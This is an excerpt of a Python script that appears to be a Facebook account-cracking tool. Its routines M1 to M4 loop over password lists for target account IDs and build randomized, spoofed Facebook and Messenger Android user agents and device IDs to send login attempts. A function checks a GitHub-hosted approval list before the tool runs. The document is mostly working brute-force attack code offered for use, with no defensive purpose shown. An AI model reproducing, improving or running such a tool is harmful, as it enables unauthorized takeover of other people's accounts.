...
\033[1;32m[\033[1;31m×\033[1;32m] \033[1;36mVERSION \033[1;37m: 0.3
\033[1;32m══════════════════════════════════════""")
def linex():
    print('\033[1;32m══════════════════════════════════════')
def clear():
...
def M1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/Orca-Android;FBAV/107.0.0.6462;FBPN/com.facebook.orca;FBLC/ex_MX;FBBV/811115591;FBCR/Banglalink;FBMF/samsung;FBBD/samsung;FBDV/GT-I9192|KOT49H;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.5,width=1401,height=1858};FB_FW/1;FBRV/811115591]"
...
def M2(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/Orca-Android;FBAV/177.0.0.4302;FBPN/com.facebook.orca;FBLC/ko_KR;FBBV/509389057;FBCR/Satcom;FBMF/samsung;FBBD/samsung;FBDV/SM-T231|KOT49H;FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=1417,height=1738};FB_FW/1;FBRV/509389057]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
...
def M3(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/Orca-Android;FBAV/134.0.0.1908;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/575726197;FBCR/Verizon;FBMF/samsung;FBBD/samsung;FBDV/SM-T310|KOT49H;FBSV/9.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1359,height=1571};FB_FW/1;FBRV/575726197]"
...
def M4(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/Orca-Android;FBAV/94.0.0.5651;FBPN/com.facebook.orca;FBLC/ja_JP;FBBV/662542725;FBCR/Smartfren;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F|LMY47V;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=808,height=1520};FB_FW/1;FBRV/662542725]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
...
def main_apv():
    ...
    print('\033[1;34m═════════════════════════════════════════')
    try:
        system = requests.get("https://github.com/MAFIAok/Aprov/blob/main/Aproval.txt").text 
        if Xyteee in system:
            print()
            msg = str(os.geteuid()) 
            time.sleep(1) 
